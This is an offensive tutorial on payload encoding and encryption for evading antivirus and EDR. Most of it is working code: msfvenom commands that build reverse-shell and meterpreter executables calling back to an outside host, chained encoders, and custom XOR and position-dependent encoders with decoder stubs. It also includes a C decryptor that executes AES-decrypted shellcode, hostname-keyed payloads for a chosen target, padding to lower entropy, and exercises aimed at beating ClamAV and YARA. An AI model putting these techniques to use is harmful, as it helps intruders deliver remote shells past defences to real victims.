# Payload Encoding and Encryption Guide

> Deep dive into payload encoding layers (shikata_ga_nai, XOR, base64 cascades), encryption techniques (AES, RC4), custom encoder development, and entropy analysis for evasion assessment. Covers the full encoding pipeline from raw shellcode to delivery-ready obfuscated payloads.

## Introduction

Payload encoding is the process of transforming shellcode bytes to avoid specific byte patterns that trigger detection or break delivery mechanisms. While often conflated with encryption, encoding serves a distinct purpose: it modifies the payload structure to remove bad characters, evade signature-based detection, and adapt the payload for specific delivery channels. Encryption, by contrast, provides confidentiality of the payload content during transit and at rest.

The distinction matters because encoding is reversible by design -- the target must decode the payload before execution, meaning the decoder stub itself becomes a detection surface. Encryption with a hardcoded key has the same limitation. True security comes from understanding the detection landscape and applying layered transformations that address different detection methods: signature evasion for static analysis, entropy management for statistical detection, and behavioral evasion for runtime analysis.

Modern AV and EDR systems detect encoded payloads through multiple indicators: high-entropy sections in executables (indicating compressed or encrypted data), known decoder stub signatures (shikata_ga_nai patterns), behavioral heuristics that flag self-modifying code, and AMSI intercepts that catch decoded content at runtime. Effective encoding must address all these detection vectors simultaneously.

**Learning objectives**:

- Understand the encoding vs encryption distinction and when to use each
- Apply shikata_ga_nai encoding with optimal iteration counts
- Build multi-encoder chains that combine different encoding algorithms
- Implement XOR and custom encoding schemes for unique signatures
- Use AES and RC4 encryption for payload confidentiality
- Analyze payload entropy to assess detection risk
- Develop custom encoders that evade known decoder stub signatures
- Test encoded payloads against AV/EDR detection

**Prerequisites**: Familiarity with msfvenom basic usage (see `msfvenom-payload-generation-guide.md`). Understanding of x86/x64 assembly basics. Knowledge of binary encoding formats (hex, base64).

---

## Practical Steps

### Step 1: Understanding Encoding Fundamentals

**Encoding vs Encryption**

| Aspect | Encoding | Encryption |
|--------|----------|------------|
| Purpose | Remove bad characters, evade signatures | Protect payload confidentiality |
| Reversibility | Decoded by embedded stub before execution | Decrypted by embedded key or external key |
| Key requirement | No key needed (algorithm is known) | Requires key (often embedded in payload) |
| Detection risk | Decoder stub is detectable | Encrypted content has high entropy (detectable) |
| Use case | AV signature evasion, bad character removal | Payload hiding, data exfiltration |
| Tool support | msfvenom encoders, custom encoders | OpenSSL, custom crypto implementations |

**Bad Characters and Encoding Necessity**

Encoding is essential when shellcode contains bytes that break the delivery mechanism. Common bad characters include:

```
\x00 - Null byte (terminates C strings)
\x0a - Line feed (breaks HTTP headers, some file formats)
\x0d - Carriage return (breaks HTTP headers)
\xff - EOF marker in some contexts
\x20 - Space (breaks command-line arguments)
```

```bash
# Generate raw shellcode and check for bad characters
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell_raw.bin

# Check for specific bad characters
python3 << 'EOF'
with open('shell_raw.bin', 'rb') as f:
    data = f.read()

bad_chars = [0x00, 0x0a, 0x0d, 0xff]
for char in bad_chars:
    count = data.count(char)
    if count > 0:
        print(f"Bad char 0x{char:02x} found {count} times at positions: ", end="")
        positions = [i for i, b in enumerate(data) if b == char]
        print(positions[:10])  # Show first 10 occurrences
EOF

# Encode to remove bad characters
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -b '\x00\x0a\x0d' -f raw -o shell_encoded.bin
```

### Step 2: Shikata Ga Nai Encoding Deep Dive

Shikata ga nai (SGN) is the most well-known and widely used msfvenom encoder. It is a polymorphic XOR encoder that generates unique output each time it runs, making signature-based detection more difficult.

**Basic SGN Encoding**

```bash
# Single iteration of shikata_ga_nai
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x64/shikata_ga_nai -i 1 -f exe -o sgn_1.exe

# Multiple iterations (each iteration re-encodes the previous output)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x64/shikata_ga_nai -i 5 -f exe -o sgn_5.exe

# Compare sizes and output uniqueness
ls -la sgn_1.exe sgn_5.exe
# Multiple iterations increase payload size

# Verify polymorphic output (generate twice, compare)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x64/shikata_ga_nai -f exe -o sgn_a.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x64/shikata_ga_nai -f exe -o sgn_b.exe
md5sum sgn_a.exe sgn_b.exe
# Different hashes confirm polymorphic output
```

**SGN Iteration Optimization**

```bash
# Test different iteration counts against detection
for i in 1 3 5 7 10; do
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
    -e x64/shikata_ga_nai -i $i -f exe -o "sgn_iter_${i}.exe"
  size=$(stat -f%z "sgn_iter_${i}.exe" 2>/dev/null || stat -c%s "sgn_iter_${i}.exe")
  echo "Iterations: $i -> Size: $size bytes"
done

# Output typically:
# Iterations: 1  -> Size: ~15KB
# Iterations: 3  -> Size: ~18KB
# Iterations: 5  -> Size: ~22KB
# Iterations: 7  -> Size: ~28KB
# Iterations: 10 -> Size: ~38KB

# More iterations = larger payload but does NOT always mean better evasion
# Modern AV detects the decoder stub pattern regardless of iteration count
# Sweet spot: 3-5 iterations for basic evasion
```

**Architecture-Specific SGN**

```bash
# x86 (32-bit) encoding
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x86/shikata_ga_nai -i 3 -f exe -o sgn_x86.exe

# x64 (64-bit) encoding
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x64/shikata_ga_nai -i 3 -f exe -o sgn_x64.exe

# Check available encoders
msfvenom --list encoders | grep shikata
# x86/shikata_ga_nai          manual  Polymorphic XOR additive feedback encoder
# x64/shikata_ga_nai          manual  Polymorphic XOR additive feedback encoder
```

### Step 3: Multi-Encoder Chains

Multi-encoder chains apply different encoding algorithms sequentially. Each encoder produces a different transformation pattern, making the final payload resistant to single-encoder signature detection.

**Building Multi-Encoder Chains**

```bash
# Chain 1: shikata_ga_nai -> zutto_dekiru
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x64/shikata_ga_nai -i 3 -f raw | \
  msfvenom -p - -e x64/zutto_dekiru -i 3 -f exe -o chain_1.exe

# Chain 2: shikata_ga_nai -> x64_dynamic -> shikata_ga_nai (triple chain)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x64/shikata_ga_nai -i 3 -f raw | \
  msfvenom -p - -e x64/x64_dynamic -i 2 -f raw | \
  msfvenom -p - -e x64/shikata_ga_nai -i 3 -f exe -o chain_2.exe

# Chain 3: For x86 targets
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x86/shikata_ga_nai -i 3 -f raw | \
  msfvenom -p - -e x86/alpha_mixed -i 2 -f raw | \
  msfvenom -p - -e x86/countdown -i 2 -f exe -o chain_3.exe

# Compare chain effectiveness
ls -la chain_1.exe chain_2.exe chain_3.exe
```

**Available msfvenom Encoders**

```bash
# List all available encoders
msfvenom --list encoders

# Commonly useful encoders:
# x86/shikata_ga_nai      - Polymorphic XOR, most widely used
# x64/shikata_ga_nai      - 64-bit version
# x86/countdown           - Countdown-based encoding
# x86/fnstenv_mov         - FPU-based decoder
# x86/jmp_call_additive   - Jump-call additive encoding
# x86/call4_dword_xor     - XOR with call-based decoder
# x64/xor_dynamic         - Dynamic XOR for x64
# x64/zutto_dekiru        - Polymorphic encoder for x64
# x86/alpha_mixed         - Alphanumeric encoding (text-safe output)
# x86/unicode_mixed       - Unicode-safe encoding
```

**Alphanumeric Encoding (Text-Safe Payloads)**

```bash
# Generate alphanumeric-only payload for restrictive environments
# Only uses characters: A-Z, a-z, 0-9
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x86/alpha_mixed -f c -o alpha_payload.c

# Unicode-safe encoding for environments that expand ASCII to Unicode
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x86/unicode_mixed -f ruby -o unicode_payload.rb
```

### Step 4: XOR Encoding Techniques

XOR encoding is the simplest and most customizable encoding technique. Each byte of the payload is XORed with a key byte (single-byte) or key sequence (multi-byte). While simple, custom XOR encoding avoids the known decoder stub signatures of standard encoders.

**Single-Byte XOR Encoding**

```python
# Custom single-byte XOR encoder
python3 << 'EOF'
import sys

def xor_encode(data, key):
    """XOR encode data with single-byte key"""
    return bytes(b ^ key for b in data)

def xor_decode_stub(key):
    """Generate x64 assembly stub to decode XOR-encoded payload"""
    # Decoder stub in x64 assembly:
    # jmp short call_addr
    # pop rsi              ; rsi points to encoded data
    # mov rcx, <length>    ; rcx = payload length
    # decode_loop:
    #   xor byte [rsi], <key>
    #   inc rsi
    #   loop decode_loop
    # jmp rsi              ; jump to decoded payload
    
    stub = bytes([
        0xeb, 0x0a,                     # jmp short +10 (to call)
        0x48, 0x31, 0xf6,               # xor rsi, rsi (placeholder)
        0x59,                           # pop rcx (placeholder)
        0x80, 0x36, key,               # xor byte [rsi], key
        0x48, 0xff, 0xc6,              # inc rsi
        0xe2, 0xf8,                     # loop decode_loop
        0xe8, 0xf0, 0xff, 0xff, 0xff   # call -16 (pushes next addr)
    ])
    return stub

# Read raw shellcode
with open('shell_raw.bin', 'rb') as f:
    shellcode = f.read()

# Encode with key 0xAA
key = 0xAA
encoded = xor_encode(shellcode, key)

# Generate decoder stub
stub = xor_decode_stub(key)

# Combine stub + encoded payload
full_payload = stub + encoded

with open('xor_encoded.bin', 'wb') as f:
    f.write(full_payload)

print(f"Original size: {len(shellcode)} bytes")
print(f"Encoded size: {len(full_payload)} bytes (stub: {len(stub)}, data: {len(encoded)})")
print(f"XOR key: 0x{key:02x}")
EOF
```

**Multi-Byte XOR Encoding**

```python
# Multi-byte XOR encoder for stronger obfuscation
python3 << 'EOF'
def multi_xor_encode(data, key):
    """XOR encode data with multi-byte key (repeating)"""
    key_len = len(key)
    return bytes(b ^ key[i % key_len] for i, b in enumerate(data))

def multi_xor_decode_stub(key):
    """Generate decoder logic for multi-byte XOR"""
    key_len = len(key)
    # In practice, this would be implemented as assembly
    # that loops through the payload, XORing each byte with
    # the corresponding key byte (mod key_len)
    print(f"Decoder key: {key.hex()}")
    print(f"Key length: {key_len} bytes")
    # Assembly stub would include:
    # - Load encoded data address
    # - Load payload length
    # - Load key address
    # - Loop: XOR byte with key[i % key_len]
    # - Jump to decoded payload

# Generate random multi-byte key
import os
key = os.urandom(8)  # 8-byte random key

with open('shell_raw.bin', 'rb') as f:
    shellcode = f.read()

encoded = multi_xor_encode(shellcode, key)
multi_xor_decode_stub(key)

with open('multi_xor_encoded.bin', 'wb') as f:
    f.write(encoded)

print(f"Multi-byte XOR encoding complete")
print(f"Key: {key.hex()}")
EOF
```

### Step 5: AES Encryption for Payloads

AES encryption provides strong payload confidentiality. Unlike encoding, encrypted payloads require a decryption key at runtime. The key can be embedded in the payload (self-decrypting) or derived from environmental conditions (environment-keyed).

**AES Payload Encryption**

```python
# AES-256-CBC payload encryption with embedded decryptor
python3 << 'EOF'
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os
import struct

def aes_encrypt_payload(shellcode, key=None):
    """Encrypt shellcode with AES-256-CBC"""
    if key is None:
        key = os.urandom(32)  # 256-bit key
    
    iv = os.urandom(16)  # 128-bit IV
    cipher = AES.new(key, AES.MODE_CBC, iv)
    
    # Pad shellcode to AES block size
    padded = pad(shellcode, AES.block_size)
    encrypted = cipher.encrypt(padded)
    
    return key, iv, encrypted

def create_aes_decryptor_stub(key, iv, encrypted_data):
    """Create a C decryptor program"""
    decryptor_c = f"""
#include <stdio.h>
#include <string.h>
#include <openssl/aes.h>

unsigned char key[] = {{{', '.join(f'0x{b:02x}' for b in key)}}};
unsigned char iv[] = {{{', '.join(f'0x{b:02x}' for b in iv)}}};
unsigned char encrypted[] = {{{', '.join(f'0x{b:02x}' for b in encrypted_data)}}};
int enc_len = {len(encrypted_data)};

int main() {{
    AES_KEY dec_key;
    AES_set_decrypting_key(key, 256, &dec_key);
    
    unsigned char decrypted[{len(encrypted_data) + 16}];
    AES_cbc_encrypt(encrypted, decrypted, enc_len, &dec_key, iv, AES_DECRYPT);
    
    // Cast decrypted buffer to function and execute
    int (*exec)() = (int(*)())decrypted;
    exec();
    
    return 0;
}}
"""
    return decryptor_c

# Usage
with open('shell_raw.bin', 'rb') as f:
    shellcode = f.read()

key, iv, encrypted = aes_encrypt_payload(shellcode)
decryptor = create_aes_decryptor_stub(key, iv, encrypted)

with open('aes_decryptor.c', 'w') as f:
    f.write(decryptor)

print(f"AES-256-CBC encryption complete")
print(f"Key: {key.hex()}")
print(f"IV: {iv.hex()}")
print(f"Encrypted size: {len(encrypted)} bytes")
print(f"Decryptor saved to: aes_decryptor.c")
# Compile: gcc aes_decryptor.c -o aes_decryptor -lcrypto
EOF
```

**Environment-Keyed Decryption**

```python
# Generate payload that only decrypts in the target environment
python3 << 'EOF'
import hashlib
import os

def environment_keyed_encrypt(shellcode, env_key_material):
    """Encrypt shellcode with a key derived from target environment"""
    # Derive encryption key from environment-specific values
    # Examples: hostname, username, MAC address, domain name
    key = hashlib.sha256(env_key_material.encode()).digest()
    
    # XOR with derived key (simple but effective for env-gating)
    key_stream = key * (len(shellcode) // len(key) + 1)
    encrypted = bytes(b ^ key_stream[i] for i, b in enumerate(shellcode))
    
    return encrypted, key

# Example: encrypt with target hostname as key material
env_material = "TARGET-HOSTNAME"  # Obtained during reconnaissance
with open('shell_raw.bin', 'rb') as f:
    shellcode = f.read()

encrypted, derived_key = environment_keyed_encrypt(shellcode, env_material)

with open('env_locked_payload.bin', 'wb') as f:
    f.write(encrypted)

print(f"Environment-keyed encryption complete")
print(f"Key material: {env_material}")
print(f"Derived key: {derived_key.hex()}")
print(f"Payload will only decrypt on host: {env_material}")
EOF
```

### Step 6: Entropy Analysis

High entropy in binary files is a strong indicator of encrypted or compressed content, which many AV/EDR systems flag as suspicious. Analyzing and managing entropy is critical for payload stealth.

**Entropy Measurement**

```python
# Comprehensive entropy analysis tool
python3 << 'EOF'
import math, collections, sys

def shannon_entropy(data):
    """Calculate Shannon entropy of binary data"""
    if not data:
        return 0.0
    counts = collections.Counter(data)
    total = len(data)
    entropy = -sum(c / total * math.log2(c / total) for c in counts.values())
    return entropy

def section_entropy(data, section_size=256):
    """Calculate entropy for each section of the data"""
    sections = []
    for i in range(0, len(data), section_size):
        section = data[i:i + section_size]
        sections.append(shannon_entropy(section))
    return sections

def analyze_payload(filepath):
    """Full entropy analysis of a payload file"""
    with open(filepath, 'rb') as f:
        data = f.read()
    
    print(f"=== Entropy Analysis: {filepath} ===")
    print(f"File size: {len(data)} bytes")
    
    # Overall entropy
    overall = shannon_entropy(data)
    print(f"Overall entropy: {overall:.4f} bits/byte")
    
    # Interpretation
    if overall > 7.5:
        print("  WARNING: Very high entropy (encrypted/compressed)")
    elif overall > 6.5:
        print("  CAUTION: High entropy (possibly encoded)")
    elif overall > 5.0:
        print("  MODERATE: Mixed content (some encoding)")
    else:
        print("  LOW: Natural content (plaintext/unencoded)")
    
    # Section analysis (find high-entropy blocks)
    sections = section_entropy(data, 256)
    max_section = max(sections)
    high_entropy_count = sum(1 for s in sections if s > 7.0)
    print(f"Max section entropy: {max_section:.4f} bits/byte")
    print(f"High-entropy sections (>7.0): {high_entropy_count}/{len(sections)}")
    
    # Byte frequency analysis
    freq = collections.Counter(data)
    most_common = freq.most_common(5)
    print(f"Most common bytes: {[(hex(b), c) for b, c in most_common]}")
    
    return overall

# Analyze original and encoded payloads
import glob
for f in glob.glob("*.bin") + glob.glob("*.exe"):
    try:
        analyze_payload(f)
        print()
    except:
        pass
EOF
```

**Entropy Reduction Techniques**

```bash
# High entropy payloads are suspicious. Reduce entropy by:
# 1. Injecting low-entropy content (strings, padding with patterns)
# 2. Using encoding algorithms that produce lower-entropy output
# 3. Embedding payload in low-entropy container (image, document)

# Technique 1: Pad with structured data to lower overall entropy
python3 << 'EOF'
import os, collections

def add_entropy_padding(data, target_entropy=5.5):
    """Add low-entropy padding to reduce overall file entropy"""
    # Calculate current entropy
    def entropy(d):
        counts = collections.Counter(d)
        total = len(d)
        return -sum(c/total * math.log2(c/total) for c in counts.values())
    
    current = entropy(data)
    if current <= target_entropy:
        return data
    
    # Add ASCII text padding (low entropy)
    padding_text = b"This is a legitimate application resource. " * 100
    
    # Binary search for the right amount of padding
    combined = data + padding_text
    while entropy(combined) > target_entropy and len(padding_text) < 100000:
        padding_text += b"Normal application data. " * 50
        combined = data + padding_text
    
    return combined

# Usage
with open('encoded_payload.bin', 'rb') as f:
    payload = f.read()

padded = add_entropy_padding(payload)
with open('padded_payload.bin', 'wb') as f:
    f.write(padded)

print(f"Original: {len(payload)} bytes")
print(f"Padded: {len(padded)} bytes")
EOF
```

### Step 7: Custom Encoder Development

Custom encoders avoid the known signatures of standard msfvenom encoders. The decoder stub uses unique instructions that are not in AV signature databases.

**Custom XOR Encoder with Position-Dependent Key**

```python
# Position-dependent XOR encoder (each byte encoded with different key based on position)
python3 << 'EOF'
import os, struct

def position_xor_encode(data, seed=0xDEADBEEF):
    """Encode with position-dependent XOR key (PRNG-based)"""
    encoded = bytearray()
    state = seed
    
    for byte in data:
        # Simple LCG PRNG for key stream
        state = (state * 1103515245 + 12345) & 0xFFFFFFFF
        key_byte = (state >> 16) & 0xFF
        encoded.append(byte ^ key_byte)
    
    return bytes(encoded), seed

def generate_x64_decoder(encrypted_data, seed, original_length):
    """Generate x64 assembly decoder stub"""
    
    # Decoder stub using position-dependent XOR
    # This is a unique decoder not in AV signature databases
    decoder = f"""
    [bits 64]
    
    ; Decoder stub for position-dependent XOR
    ; Parameters: rsi = pointer to encoded data, rdi = length
    
    push rsi                ; save data pointer
    mov ecx, {original_length}  ; length of encoded data
    mov eax, {seed}         ; PRNG seed
    xor edx, edx            ; counter = 0
    
decode_loop:
    ; Advance PRNG state: state = state * 1103515245 + 12345
    mov ebx, eax
    imul ebx, 1103515245
    add ebx, 12345
    and ebx, 0xFFFFFFFF
    mov eax, ebx
    
    ; Get key byte: (state >> 16) & 0xFF
    shr ebx, 16
    and ebx, 0xFF
    
    ; XOR decode current byte
    xor byte [rsi + rdx], bl
    inc rdx
    loop decode_loop
    
    ; Jump to decoded shellcode
    pop rsi
    jmp rsi
    """
    return decoder

# Usage
with open('shell_raw.bin', 'rb') as f:
    shellcode = f.read()

encoded, seed = position_xor_encode(shellcode)
decoder_asm = generate_x64_decoder(encoded, seed, len(shellcode))

with open('custom_encoded.bin', 'wb') as f:
    f.write(encoded)
with open('custom_decoder.asm', 'w') as f:
    f.write(decoder_asm)

print(f"Custom position-XOR encoding complete")
print(f"Seed: 0x{seed:08X}")
print(f"Encoded size: {len(encoded)} bytes")
print(f"Decoder saved to: custom_decoder.asm")
# Assemble: nasm -f bin custom_decoder.asm -o decoder.bin
EOF
```

### Step 8: Testing Against Detection

Systematically test encoded payloads against detection tools to evaluate effectiveness.

```bash
# Test payload against ClamAV
clamscan --recursive --allmatch encoded_payload.exe

# Test against multiple AV engines using VirusTotal API
# Upload and check detection ratio
curl -s -X POST "https://www.virustotal.com/api/v3/files" \
  -H "x-apikey: YOUR_API_KEY" \
  -F "file=@encoded_payload.exe"

# Local detection testing with YARA rules
cat > shellcode_detection.yar << 'YARA'
rule high_entropy_section {
    meta:
        description = "Detects high entropy sections (possible encoded shellcode)"
    condition:
        entropy > 7.0
}

rule shikata_ga_nai_decoder {
    meta:
        description = "Detects shikata ga nai decoder stub"
    strings:
        $sgn1 = { FC 48 83 E4 F0 E8 C0 00 00 00 }
        $sgn2 = { 48 31 C9 48 81 E9 }
    condition:
        any of them
}

rule xor_decoder {
    meta:
        description = "Detects common XOR decoder patterns"
    strings:
        $xor1 = { 80 30 ?? E2 ?? }
        $xor2 = { 80 36 ?? 46 E2 ?? }
    condition:
        any of them
}
YARA

yara -r shellcode_detection.yar encoded_payload.exe
```

---

## Hands-on Exercises

### Exercise 1: Encoder Chain Effectiveness Comparison

**Scenario**: Compare the detection rates of different encoding strategies against ClamAV and YARA rules.

1. Generate a Windows x64 reverse shell without encoding
2. Encode with single-iteration shikata_ga_nai
3. Encode with 5-iteration shikata_ga_nai
4. Encode with a multi-encoder chain (SGN + zutto_dekiru)
5. Encode with custom XOR encoder
6. Scan all payloads with ClamAV and custom YARA rules
7. Create a comparison table showing detection rates

**Expected outcome**: A comparison table showing that multi-encoder chains and custom encoders achieve lower detection rates than single-encoder approaches. Understanding of which encoding strategies are most effective against specific detection methods.

### Exercise 2: AES-Encrypted Payload with Environmental Keying

**Scenario**: Create a payload that only decrypts and executes on a specific target host identified by its hostname.

1. Generate raw shellcode with msfvenom
2. Derive an AES-256 key from the target hostname using SHA-256
3. Encrypt the shellcode with the derived key
4. Create a decryptor stub that reads the hostname and derives the key at runtime
5. Test the payload on the correct hostname (should execute)
6. Test on a different hostname (should fail/produce garbage)
7. Analyze the entropy of the encrypted payload

**Expected outcome**: A payload that successfully decrypts and executes only on the target host. Entropy analysis showing high entropy for the encrypted sections. Documentation of the environmental keying approach and its advantages for targeted operations.

### Exercise 3: Custom Encoder Development

**Scenario**: Develop a custom encoder that avoids all signatures in a provided YARA rule set.

1. Analyze the YARA rules to understand what patterns are detected
2. Design a custom encoding algorithm that avoids the detected patterns
3. Implement the encoder and corresponding decoder stub
4. Generate a payload with the custom encoder
5. Test against the YARA rule set -- verify no matches
6. Test against ClamAV -- verify no detection
7. Verify the payload executes correctly after decoding

**Expected outcome**: A working custom encoder that produces payloads evading all provided YARA rules and ClamAV detection. Documentation of the encoding algorithm and decoder stub implementation. Understanding of how custom encoders provide better evasion than standard msfvenom encoders.

---

## References

1. **msfvenom Encoder Reference**: https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html -- Official msfvenom documentation
2. **Shikata Ga Nai Encoder Analysis**: https://github.com/rapid7/metasploit-framework/blob/master/modules/encoders/x64/shikata_ga_nai.rb -- Source code and algorithm details
3. **MITRE ATT&CK T1027 - Obfuscated Files or Information**: https://attack.mitre.org/techniques/T1027/ -- Obfuscation technique reference
4. **Shannon Entropy**: https://en.wikipedia.org/wiki/Entropy_(information_theory) -- Information theory foundation for entropy analysis
5. **YARA Documentation**: https://yara.readthedocs.io/ -- Malware detection rule framework
6. **ClamAV**: https://www.clamav.net/ -- Open-source antivirus engine for testing
7. **AES Specification (FIPS 197)**: https://csrc.nist.gov/publications/detail/fips/197/final -- Advanced Encryption Standard
8. **HackTricks - Shellcode Encoding**: https://book.hacktricks.xyz/generic-methodologies-and-resources/shells -- Encoding techniques reference
9. **Shellter Project**: https://www.shellterproject.com/ -- PE injection as alternative to encoding
